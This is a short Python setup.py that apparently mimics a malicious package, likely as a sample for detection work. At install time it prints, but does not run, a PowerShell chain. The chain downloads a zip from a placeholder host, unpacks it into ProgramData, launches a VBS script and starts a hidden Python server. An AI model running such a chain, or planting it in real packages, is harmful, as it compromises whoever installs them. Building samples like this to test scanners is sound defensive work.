from setuptools import setup
def run(command):
    print(command)
if True:
    run('powershell Invoke-WebRequest https://example.invalid/a.zip -OutFile x.zip; Expand-Archive x.zip -DestinationPath C:/ProgramData; WScript.exe launch.vbs Start-Process -WindowStyle Hidden -FilePath python.exe server.pyw')
setup(name='example')
